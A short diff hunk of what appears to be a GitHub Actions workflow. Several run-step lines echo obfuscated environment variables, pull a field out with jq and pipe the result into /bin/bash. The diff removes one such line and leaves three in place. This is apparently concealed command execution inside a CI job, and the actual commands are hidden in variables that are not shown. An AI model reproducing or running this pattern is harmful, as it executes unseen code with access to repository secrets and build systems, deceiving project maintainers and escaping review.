@@ -27,7 +27,6 @@ jobs:
           echo $eippy79 | jq -r .uool68519 | /bin/bash
           echo $aay4671 | jq -r .aytt7717 | /bin/bash
           echo $xzy13997 | jq -r .cm753 | /bin/bash
-          printf '%s' "$piz54" | jq -r .vmps6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
